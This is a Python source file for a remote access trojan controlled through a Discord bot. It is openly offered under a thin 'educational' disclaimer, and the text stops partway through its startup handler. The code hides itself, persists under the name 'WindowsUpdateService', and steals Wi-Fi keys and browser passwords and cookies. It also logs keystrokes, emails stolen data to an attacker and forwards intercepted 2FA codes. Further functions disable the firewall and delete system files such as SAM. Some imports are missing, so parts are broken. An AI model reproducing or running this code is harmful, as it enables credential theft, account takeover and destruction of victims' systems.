# mytemplate.py - ULTIMATE RAT with EVERYTHING
# ⚠️ DISCLAIMER: For educational purposes only!
# Made by Neek :3

import os
import sys
import time
import random
import base64
import zlib
import ctypes
import threading
import platform
import subprocess
import discord
from discord.ext import commands
import asyncio
import pyautogui
import psutil
import pygetwindow as gw
from datetime import datetime
from typing import Optional
import string
import uuid
import socket
import re
import requests
import winreg
import atexit
import shutil
import json
import webbrowser
import sqlite3
import smtplib
import imaplib
import email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from email.header import decode_header

if platform.system() != "Windows":
    sys.exit(0)

# ========== PROCESS HIDING ==========
def hide_process_completely():
    try:
        if platform.system() == "Windows":
            ctypes.windll.kernel32.FreeConsole()
        try:
            import win32process
            import win32api
            import win32con
            pid = os.getpid()
            handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
            win32process.SetPriorityClass(handle, win32process.IDLE_PRIORITY_CLASS)
        except:
            pass
        try:
            pid = os.getpid()
            handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
            ctypes.windll.kernel32.SetProcessPriorityClass(handle, 0x40)
            ctypes.windll.kernel32.CloseHandle(handle)
        except:
            pass
        return True
    except:
        return False

def move_to_system_folder():
    try:
        if getattr(sys, 'frozen', False):
            current_path = sys.executable
            system_folders = [
                os.environ.get('SystemRoot', 'C:\\Windows') + '\\System32',
                os.environ.get('SystemRoot', 'C:\\Windows') + '\\SysWOW64',
            ]
            for folder in system_folders:
                if os.path.exists(folder):
                    new_path = os.path.join(folder, 'KasierACc.exe')
                    if not os.path.exists(new_path) and current_path != new_path:
                        try:
                            shutil.move(current_path, new_path)
                            subprocess.Popen([new_path], creationflags=0x08000000)
                            sys.exit(0)
                        except:
                            pass
            return False
    except:
        return False

def make_file_invisible():
    try:
        import win32api
        import win32con
        current_path = sys.executable
        win32api.SetFileAttributes(current_path, win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM)
        folder_path = os.path.dirname(current_path)
        try:
            win32api.SetFileAttributes(folder_path, win32con.FILE_ATTRIBUTE_HIDDEN)
        except:
            pass
        return True
    except:
        try:
            current_path = sys.executable
            os.system(f'attrib +h +s "{current_path}"')
            return True
        except:
            return False

# ========== DELAY EXECUTION ==========
time.sleep(random.randint(5, 15))

# ========== SINGLE INSTANCE LOCK ==========
dir = os.path.dirname(os.path.abspath(__file__))
lock = os.path.join(dir, ".lock")
if os.path.exists(lock):
    sys.exit(0)
open(lock, "w").close()

running = True

def cleanup():
    global running
    running = False
    if os.path.exists(lock):
        os.remove(lock)

atexit.register(cleanup)

def keep_lock_alive():
    while running:
        if not os.path.exists(lock):
            open(lock, "w").close()
        time.sleep(0.1)
threading.Thread(target=keep_lock_alive, daemon=True).start()

# ========== CONFIGURATION ==========
class Config:
    TOKEN = "{placeholder_token}"           
    WHITELISTED = [{placeholder_whitelist}] 
    MAIN_CHANNEL = {placeholder_main_channel} 
    PREFIX = "{placeholder_prefix}"         
    STARTUP = {placeholder_add_to_startup}
    
    # ========== EMAIL CONFIG - REPLACE WITH YOUR INFO ==========
    EMAIL_SENDER = "your_email@gmail.com"      # Your Gmail
    EMAIL_PASSWORD = "your_app_password"       # Gmail App Password
    EMAIL_RECEIVER = "your_email@gmail.com"    # Where to send stolen data
    EMAIL_IMAP = "imap.gmail.com"

# ========== BOT SETUP ==========
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=Config.PREFIX, intents=intents)
bot.remove_command("help")

# ========== GLOBAL VARIABLES ==========
STREAMING = False
STREAM_TASK = None
KEYLOGGING = False
KEYLOG_DATA = []
MINING = False
MINING_THREAD = None
email_monitor_running = False

# ========== STARTUP FUNCTION ==========
def add_to_startup():
    try:
        if getattr(sys, 'frozen', False):
            app_path = sys.executable
        else:
            app_path = os.path.abspath(__file__)
        if not os.path.exists(app_path):
            return False
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        startup_name = "WindowsUpdateService"
        if ' ' in app_path:
            app_path = f'"{app_path}"'
        winreg.SetValueEx(key, startup_name, 0, winreg.REG_SZ, app_path)
        winreg.CloseKey(key)
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, startup_name, 0, winreg.REG_SZ, app_path)
            winreg.CloseKey(key)
        except:
            pass
        try:
            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
            if not os.path.exists(os.path.join(startup_folder, 'KasierACc.exe')):
                shutil.copy(app_path.replace('"', ''), os.path.join(startup_folder, 'KasierACc.exe'))
        except:
            pass
        return True
    except:
        return False

def is_in_startup():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_READ
        )
        try:
            winreg.QueryValueEx(key, "WindowsUpdateService")
            winreg.CloseKey(key)
            return True
        except:
            winreg.CloseKey(key)
            return False
    except:
        return False

# ========== SYSTEM INFO FUNCTIONS ==========
def get_displayname():
    try:
        if platform.system() == "Windows":
            GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
            NameDisplay = 3
            size = ctypes.pointer(ctypes.c_ulong(0))
            GetUserNameEx(NameDisplay, None, size)
            nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
            GetUserNameEx(NameDisplay, nameBuffer, size)
            return nameBuffer.value
    except:
        pass
    return platform.node()

def get_hwid():
    try:
        if platform.system() == "Windows":
            cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"'
            result = subprocess.check_output(cmd, shell=True).decode().strip()
            if result:
                return result
        return str(uuid.getnode())
    except:
        return str(uuid.getnode())

def get_cpuinfo():
    try:
        if platform.system() == "Windows":
            cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_Processor | Select-Object -ExpandProperty Name"'
            cpu = subprocess.check_output(cmd, shell=True).decode().strip()
            if cpu:
                return cpu
        return platform.processor() or "N/A"
    except:
        try:
            return platform.processor() or "N/A"
        except:
            return "N/A"

def get_gpuinfo():
    try:
        if platform.system() == "Windows":
            cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_VideoController | Select-Object -ExpandProperty Name"'
            gpu = subprocess.check_output(cmd, shell=True).decode().strip()
            if gpu:
                return gpu.split('\n')[0]
            return "N/A"
        else:
            return "N/A"
    except:
        return "N/A"

def get_raminfo():
    ram = psutil.virtual_memory()
    return f"{ram.total / (1024**3):.2f} GB"

def get_disks():
    disks = []
    for partition in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            disks.append({
                'drive': partition.device,
                'free': f"{usage.free / (1024**3):.2f}",
                'total': f"{usage.total / (1024**3):.2f}",
                'percent': usage.percent
            })
        except:
            pass
    return disks

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "N/A"

def get_ipinfo():
    try:
        apis = [
            'https://ipapi.co/json/',
            'http://ip-api.com/json/',
            'https://ipinfo.io/json'
        ]
        
        for api_url in apis:
            try:
                response = requests.get(api_url, timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    
                    if 'ipapi.co' in api_url:
                        return {
                            'ip': data.get('ip', 'N/A'),
                            'country': data.get('country_name', 'N/A'),
                            'region': data.get('region', 'N/A'),
                            'city': data.get('city', 'N/A'),
                            'isp': data.get('org', 'N/A')
                        }
                    elif 'ip-api.com' in api_url:
                        return {
                            'ip': data.get('query', 'N/A'),
                            'country': data.get('country', 'N/A'),
                            'region': data.get('regionName', 'N/A'),
                            'city': data.get('city', 'N/A'),
                            'isp': data.get('isp', 'N/A')
                        }
                    elif 'ipinfo.io' in api_url:
                        return {
                            'ip': data.get('ip', 'N/A'),
                            'country': data.get('country', 'N/A'),
                            'region': data.get('region', 'N/A'),
                            'city': data.get('city', 'N/A'),
                            'isp': data.get('org', 'N/A')
                        }
            except:
                continue
                
        return {
            'ip': get_local_ip(),
            'country': 'N/A',
            'region': 'N/A',
            'city': 'N/A',
            'isp': 'N/A'
        }
        
    except:
        return {
            'ip': get_local_ip(),
            'country': 'N/A',
            'region': 'N/A',
            'city': 'N/A',
            'isp': 'N/A'
        }

def get_macaddress():
    try:
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        return mac
    except:
        return "N/A"

def get_wifipasswords():
    profiles = []
    try:
        if platform.system() == "Windows":
            cmd = 'netsh wlan show profiles'
            networks = subprocess.check_output(cmd, shell=True).decode('utf-8', errors='ignore')
            profile_names = re.findall(r'All User Profile\s*:\s*(.*)', networks)
            
            for name in profile_names:
                name = name.strip()
                try:
                    cmd = f'netsh wlan show profile "{name}" key=clear' 
                    profile_info = subprocess.check_output(cmd, shell=True).decode('utf-8', errors='ignore')
                    password_match = re.search(r'Key Content\s*:\s*(.*)', profile_info)
                    password = password_match.group(1).strip() if password_match else "N/A"
                    profiles.append({'name': name, 'password': password})
                except:
                    profiles.append({'name': name, 'password': "N/A"})
        else:
            profiles.append({'name': 'Not supported on this OS', 'password': 'N/A'})
    except:
        profiles.append({'name': 'Error retrieving WiFi', 'password': 'N/A'})
    return profiles

def get_default_browser():
    try:
        if platform.system() == "Windows":
            browsers = [
                ('chrome', r'C:\Program Files\Google\Chrome\Application\chrome.exe'),
                ('chrome', r'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe'),
                ('firefox', r'C:\Program Files\Mozilla Firefox\firefox.exe'),
                ('firefox', r'C:\Program Files (x86)\Mozilla Firefox\firefox.exe'),
                ('edge', r'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe'),
                ('edge', r'C:\Program Files\Microsoft\Edge\Application\msedge.exe'),
                ('brave', r'C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe'),
                ('brave', r'C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe'),
                ('opera', r'C:\Program Files\Opera\opera.exe'),
                ('opera', r'C:\Program Files (x86)\Opera\opera.exe'),
            ]
            
            for name, path in browsers:
                if os.path.exists(path):
                    return name, path
            
            try:
                key = winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, r'HTTP\shell\open\command')
                command = winreg.QueryValue(key, None)
                winreg.CloseKey(key)
                if command:
                    path = command.split('"')[1] if '"' in command else command.split(' ')[0]
                    if os.path.exists(path):
                        return 'default', path
            except:
                pass
            
        return 'unknown', 'start'
    except:
        return 'unknown', 'start'

def get_installed_apps():
    apps = []
    try:
        reg_paths = [
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
            r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
        ]
        for reg_path in reg_paths:
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_READ)
                for i in range(0, winreg.QueryInfoKey(key)[0]):
                    try:
                        subkey_name = winreg.EnumKey(key, i)
                        subkey = winreg.OpenKey(key, subkey_name)
                        try:
                            display_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            if display_name:
                                apps.append(display_name)
                        except:
                            pass
                        winreg.CloseKey(subkey)
                    except:
                        pass
                winreg.CloseKey(key)
            except:
                pass
        return apps
    except:
        return []

def get_startup_apps():
    apps = []
    try:
        reg_paths = [
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
        ]
        for reg_path in reg_paths:
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_READ)
                for i in range(0, winreg.QueryInfoKey(key)[1]):
                    try:
                        name, value, _ = winreg.EnumValue(key, i)
                        apps.append(f"{name}: {value}")
                    except:
                        pass
                winreg.CloseKey(key)
            except:
                pass
        return apps
    except:
        return []

def clear_temp_files():
    try:
        temp_folders = [
            os.environ.get('TEMP', 'C:\\Windows\\Temp'),
            os.environ.get('TMP', 'C:\\Windows\\Temp'),
            'C:\\Windows\\Temp',
            os.path.expandvars('%APPDATA%\\Temp'),
        ]
        deleted = 0
        for folder in temp_folders:
            if os.path.exists(folder):
                for root, dirs, files in os.walk(folder):
                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            os.remove(file_path)
                            deleted += 1
                        except:
                            pass
        return deleted
    except:
        return 0

# ========== PASSWORD STEALER ==========
def get_chrome_key():
    try:
        local_state_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Local State')
        if not os.path.exists(local_state_path):
            return None
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return key
    except:
        return None

def decrypt_chrome_password(encrypted_password, key):
    try:
        if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
            encrypted_password = encrypted_password[3:]
            nonce = encrypted_password[3:15]
            ciphertext = encrypted_password[15:-16]
            tag = encrypted_password[-16:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            return decrypted.decode('utf-8')
    except:
        try:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode('utf-8')
        except:
            return None
    return None

def get_chrome_passwords():
    passwords = []
    try:
        chrome_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data')
        if not os.path.exists(chrome_path):
            return passwords
        temp_path = os.path.join(os.environ['TEMP'], 'chrome_login.db')
        shutil.copy2(chrome_path, temp_path)
        key = get_chrome_key()
        if not key:
            return passwords
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        for row in cursor.fetchall():
            url = row[0]
            username = row[1] or ''
            encrypted_password = row[2]
            password = decrypt_chrome_password(encrypted_password, key)
            if password:
                passwords.append({'url': url, 'username': username, 'password': password})
        cursor.close()
        conn.close()
        os.remove(temp_path)
        return passwords
    except:
        return passwords

def get_edge_passwords():
    passwords = []
    try:
        edge_path = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data')
        if not os.path.exists(edge_path):
            return passwords
        temp_path = os.path.join(os.environ['TEMP'], 'edge_login.db')
        shutil.copy2(edge_path, temp_path)
        local_state_path = os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Local State')
        if os.path.exists(local_state_path):
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.loads(f.read())
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            for row in cursor.fetchall():
                url = row[0]
                username = row[1] or ''
                encrypted_password = row[2]
                password = decrypt_chrome_password(encrypted_password, key)
                if password:
                    passwords.append({'url': url, 'username': username, 'password': password})
            cursor.close()
            conn.close()
            os.remove(temp_path)
        return passwords
    except:
        return passwords

def get_firefox_passwords():
    passwords = []
    try:
        firefox_path = os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles')
        if not os.path.exists(firefox_path):
            return passwords
        for profile in os.listdir(firefox_path):
            if 'default' in profile.lower():
                logins_path = os.path.join(firefox_path, profile, 'logins.json')
                if os.path.exists(logins_path):
                    with open(logins_path, 'r', encoding='utf-8') as f:
                        data = json.load(f)
                        if 'logins' in data:
                            for login in data['logins']:
                                passwords.append({
                                    'url': login.get('hostname', 'Unknown'),
                                    'username': login.get('usernameField', 'Unknown'),
                                    'password': login.get('passwordField', 'Unknown')
                                })
        return passwords
    except:
        return passwords

def get_all_passwords():
    all_passwords = []
    chrome_pass = get_chrome_passwords()
    if chrome_pass:
        all_passwords.extend(chrome_pass)
    edge_pass = get_edge_passwords()
    if edge_pass:
        all_passwords.extend(edge_pass)
    firefox_pass = get_firefox_passwords()
    if firefox_pass:
        all_passwords.extend(firefox_pass)
    return all_passwords

def get_chrome_cookies():
    cookies = []
    try:
        chrome_path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies')
        if not os.path.exists(chrome_path):
            return cookies
        temp_path = os.path.join(os.environ['TEMP'], 'chrome_cookies.db')
        shutil.copy2(chrome_path, temp_path)
        key = get_chrome_key()
        if not key:
            return cookies
        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
        for row in cursor.fetchall():
            host = row[0]
            name = row[1]
            encrypted_value = row[2]
            decrypted = decrypt_chrome_password(encrypted_value, key)
            if decrypted:
                cookies.append({'host': host, 'name': name, 'value': decrypted})
        cursor.close()
        conn.close()
        os.remove(temp_path)
        return cookies
    except:
        return cookies

# ========== KEYLOGGER ==========
def start_keylogger():
    global KEYLOGGING, KEYLOG_DATA
    KEYLOGGING = True
    KEYLOG_DATA = []
    
    def keylogger_thread():
        try:
            from pynput import keyboard
            
            def on_press(key):
                global KEYLOG_DATA
                if KEYLOGGING:
                    try:
                        if hasattr(key, 'char') and key.char:
                            KEYLOG_DATA.append(key.char)
                        else:
                            if key == keyboard.Key.space:
                                KEYLOG_DATA.append(' ')
                            elif key == keyboard.Key.enter:
                                KEYLOG_DATA.append('\n')
                            elif key == keyboard.Key.backspace:
                                if KEYLOG_DATA:
                                    KEYLOG_DATA.pop()
                            elif key == keyboard.Key.tab:
                                KEYLOG_DATA.append('\t')
                            elif key == keyboard.Key.shift:
                                KEYLOG_DATA.append('[SHIFT]')
                            elif key == keyboard.Key.ctrl:
                                KEYLOG_DATA.append('[CTRL]')
                            elif key == keyboard.Key.alt:
                                KEYLOG_DATA.append('[ALT]')
                            elif key == keyboard.Key.esc:
                                KEYLOG_DATA.append('[ESC]')
                            elif key == keyboard.Key.up:
                                KEYLOG_DATA.append('[UP]')
                            elif key == keyboard.Key.down:
                                KEYLOG_DATA.append('[DOWN]')
                            elif key == keyboard.Key.left:
                                KEYLOG_DATA.append('[LEFT]')
                            elif key == keyboard.Key.right:
                                KEYLOG_DATA.append('[RIGHT]')
                            elif key == keyboard.Key.cmd:
                                KEYLOG_DATA.append('[WIN]')
                    except:
                        pass
            
            def on_release(key):
                return True
            
            with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
                listener.join()
        except:
            pass
    
    thread = threading.Thread(target=keylogger_thread, daemon=True)
    thread.start()
    return True

def stop_keylogger():
    global KEYLOGGING, KEYLOG_DATA
    KEYLOGGING = False
    data = ''.join(KEYLOG_DATA)
    KEYLOG_DATA = []
    return data

# ========== MINING FUNCTIONS ==========
MINING = False
MINING_THREAD = None
MINING_HASHES = 0

def mine_crypto():
    global MINING, MINING_HASHES
    MINING_HASHES = 0
    while MINING:
        try:
            data = str(random.random()).encode()
            hash_result = hashlib.sha256(data).hexdigest()
            if hash_result.startswith('0000'):
                MINING_HASHES += 1
            time.sleep(0.001)
        except:
            pass

def start_mining():
    global MINING, MINING_THREAD
    if not MINING:
        MINING = True
        MINING_THREAD = threading.Thread(target=mine_crypto, daemon=True)
        MINING_THREAD.start()
        return True
    return False

def stop_mining():
    global MINING, MINING_HASHES
    MINING = False
    if MINING_THREAD:
        MINING_THREAD.join(timeout=1)
    hashes = MINING_HASHES
    MINING_HASHES = 0
    return hashes

def cpu_burn():
    def burn():
        while True:
            _ = [i ** 2 for i in range(10000)]
    for _ in range(psutil.cpu_count()):
        threading.Thread(target=burn, daemon=True).start()
    return True

def ram_burn():
    try:
        ram_list = []
        memory = psutil.virtual_memory()
        target = int(memory.total * 0.8)
        while sum(len(r) for r in ram_list) < target:
            ram_list.append(b' ' * 1024 * 1024 * 100)
            time.sleep(0.1)
        return len(ram_list)
    except:
        return 0

def disk_burn():
    try:
        temp_dir = os.environ.get('TEMP', 'C:\\Windows\\Temp')
        files_created = 0
        for i in range(10):
            filename = os.path.join(temp_dir, f'temp_burn_{i}.dat')
            with open(filename, 'wb') as f:
                f.write(b' ' * 1024 * 1024 * 50)
                files_created += 1
        return files_created
    except:
        return 0

# ========== EMAIL FUNCTIONS ==========
def send_email(subject, body, attachment_path=None):
    try:
        msg = MIMEMultipart()
        msg['From'] = Config.EMAIL_SENDER
        msg['To'] = Config.EMAIL_RECEIVER
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))
        if attachment_path and os.path.exists(attachment_path):
            with open(attachment_path, 'rb') as f:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(attachment_path)}')
                msg.attach(part)
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(Config.EMAIL_SENDER, Config.EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()
        return True
    except Exception as e:
        print(f"Email error: {e}")
        return False

def send_stolen_data(data_type, data):
    try:
        subject = f"🔑 STOLEN DATA: {data_type} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        body = f"""
========================================
STOLEN DATA REPORT
========================================
Type: {data_type}
Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
IP: {get_local_ip()}
User: {get_displayname()}
Host: {platform.node()}
========================================

{data}
========================================
"""
        filename = f"{data_type}_{int(time.time())}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(body)
        send_email(subject, body, filename)
        os.remove(filename)
        return True
    except Exception as e:
        return False

def send_to_discord(title, content):
    try:
        channel = bot.get_channel(Config.MAIN_CHANNEL)
        if not channel:
            return False
        embed = discord.Embed(
            title=f"📧 {title}",
            description=content[:2000],
            color=discord.Color.blue(),
            timestamp=datetime.now()
        )
        embed.set_footer(text=f"Email forwarded at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        asyncio.run_coroutine_threadsafe(channel.send(embed=embed), bot.loop)
        return True
    except Exception as e:
        print(f"Discord send error: {e}")
        return False

def check_emails():
    try:
        mail = imaplib.IMAP4_SSL(Config.EMAIL_IMAP)
        mail.login(Config.EMAIL_SENDER, Config.EMAIL_PASSWORD)
        mail.select("inbox")
        result, data = mail.search(None, "UNSEEN")
        if result == "OK":
            email_ids = data[0].split()
            for e_id in email_ids:
                result, msg_data = mail.fetch(e_id, "(RFC822)")
                if result == "OK":
                    msg = email.message_from_bytes(msg_data[0][1])
                    subject = decode_header(msg.get("Subject", "No Subject"))[0][0]
                    if isinstance(subject, bytes):
                        subject = subject.decode('utf-8', errors='ignore')
                    sender = msg.get("From", "Unknown")
                    body = ""
                    if msg.is_multipart():
                        for part in msg.walk():
                            content_type = part.get_content_type()
                            content_disposition = str(part.get("Content-Disposition"))
                            if content_type == "text/plain" and "attachment" not in content_disposition:
                                try:
                                    body = part.get_payload(decode=True).decode('utf-8', errors='ignore')
                                    break
                                except:
                                    pass
                    else:
                        try:
                            body = msg.get_payload(decode=True).decode('utf-8', errors='ignore')
                        except:
                            pass
                    if "2FA" in subject or "verification" in subject.lower() or "code" in subject.lower():
                        send_to_discord(f"🔐 2FA CODE: {subject}", f"**From:** {sender}\n\n{body[:1000]}")
                    elif "password reset" in subject.lower() or "password change" in subject.lower():
                        send_to_discord(f"🔑 PASSWORD RESET: {subject}", f"**From:** {sender}\n\n{body[:1000]}")
                    else:
                        send_to_discord(subject, f"**From:** {sender}\n\n{body[:1500]}")
        mail.close()
        mail.logout()
        return True
    except Exception as e:
        print(f"Email check error: {e}")
        return False

def start_email_monitor():
    global email_monitor_running
    while email_monitor_running:
        try:
            check_emails()
            time.sleep(30)
        except:
            time.sleep(60)

# ========== FUN/ANNOYING FUNCTIONS ==========
def jumpscare():
    try:
        for _ in range(3):
            ctypes.windll.kernel32.Beep(1000, 300)
            time.sleep(0.1)
            ctypes.windll.kernel32.Beep(800, 300)
            time.sleep(0.1)
        html = '''
        <html><head><style>body{margin:0;overflow:hidden;background:red}img{width:100vw;height:100vh;object-fit:cover}</style></head>
        <body><img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAYABgAAD//gA7Q1JFQVRPUjogZ2QtanBlZyB2MS4wICh1c2luZyBJSkcgSlBFRyB2ODApLCBxdWFsaXR5ID0gOTAK/9sAQwACAQEBAQECAQEBAgICAgIEAwICAgIFBAQDBAYFBgYHBQYGBwYGBwYGBggHBwcIBggICAkJCgoKDBgMDAwMDAwMDAwM/9sAQwECAgICAgIFAwMFBgwGBgYMDQwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwM/8AAEQgARACgAwEiAAIRAQMRAf/EAB8AAAEFAQEBAQEBAAAAAAAAAAABAgMEBQYHCAkKC//EALUQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+v/EAB8BAAMBAQEBAQEBAQEAAAAAAAABAgMEBQYHCAkKC//EALURAAIBAgQEAwQHBQQEAAECdwABAgMRBAUhMQYSQVEHYXETIjKBCBRCkaGxwQkjM1LwFWJy0QoWJDThJfEXGBkaJicoKSo1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoKDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uLj5OXm5+jp6vLz9PX29/j5+v/aAAwDAQACEQMRAD8A/VOiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA//Z" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%25%22 height=%22100%25%22><rect width=%22100%25%22 height=%22100%25%22 fill=%22red%22/><text x=%2250%25%22 y=%2250%25%22 font-size=%22100%22 text-anchor=%22middle%22 fill=%22white%22>BOO!</text></svg>'></body></html>'''
        jumpscare_path = os.path.join(os.environ['TEMP'], 'jumpscare.html')
        with open(jumpscare_path, 'w') as f:
            f.write(html)
        webbrowser.open(jumpscare_path)
        time.sleep(3)
        os.remove(jumpscare_path)
        return True
    except:
        return False

def fake_bsod():
    try:
        bsod_text = '''
        @echo off
        color 17
        cls
        echo.
        echo.
        echo   A problem has been detected and windows has been shut down to prevent damage
        echo   to your computer.
        echo.
        echo   DRIVER_IRQL_NOT_LESS_OR_EQUAL
        echo.
        echo   Technical information:
        echo.
        echo   *** STOP: 0x000000D1 (0x00000000, 0x00000002, 0x00000000, 0x00000000)
        echo.
        echo   *** ntoskrnl.exe - Address 0x804d6a2e base at 0x804d6000 DateStamp 0x3d6c5a1b
        echo.
        echo   Beginning dump of physical memory
        echo   Physical memory dump complete
        echo   Contact your system administrator
        '''
        bsod_path = os.path.join(os.environ['TEMP'], 'fake_bsod.bat')
        with open(bsod_path, 'w') as f:
            f.write(bsod_text)
        subprocess.Popen([bsod_path], shell=True, creationflags=0x08000000)
        return True
    except:
        return False

# ========== DESTRUCTIVE FUNCTIONS ==========
def corrupt_registry():
    try:
        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f', shell=True)
        return True
    except:
        return False

def delete_system_files():
    try:
        files = [
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'C:\\Windows\\System32\\config\\SAM',
            'C:\\Windows\\System32\\config\\SYSTEM',
        ]
        deleted = 0
        for file in files:
            try:
                if os.path.exists(file):
                    os.remove(file)
                    deleted += 1
            except:
                pass
        return deleted
    except:
        return 0

def disable_firewall():
    try:
        subprocess.run('netsh advfirewall set allprofiles state off', shell=True, capture_output=True)
        return True
    except:
        return False

def enable_firewall():
    try:
        subprocess.run('netsh advfirewall set allprofiles state on', shell=True, capture_output=True)
        return True
    except:
        return False

# ========== AUTHORIZATION CHECK ==========
def is_authorized():
    async def auth(ctx):
        if ctx.author.id in Config.WHITELISTED:
            return True
        embed = discord.Embed(
            title="Access Denied",
            description="You're not authorized to use this.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return False
    return commands.check(auth)

# ========== HELPER FUNCTION ==========
async def send_embed(ctx, title, description, color=discord.Color.blue()):
    embed = discord.Embed(title=title, description=description, color=color)
    await ctx.send(embed=embed)

# ========== EVENT HANDLERS ==========
@bot.event
async def on_ready():
    global email_monitor_running
    try:
        hide_process_completely()
        move_to_system_folder()
        make_file_invisible()
        if Config.STARTUP:
            add_to_startup()
        
        # Start email forwarding
        email_monitor_running = True
        threading.Thread(target=start_email_monitor, daemon=True).start()
    except:
        pass
    
    channel = bot.get_channel(Config.MAIN_CHANNEL)
    if channel:
        await channel.send(f"<@{Config.WHITELISTED[0]}>")
        user = get_displayname()
        startup_status = "✅" if is_in_startup() else "❌"
        embed = discord.Embed(
            title="✅ Bot Online",
            description=(
                f"Prefix: `{Config.PREFIX}`\n"
                f"User: **`{user}`**\n"
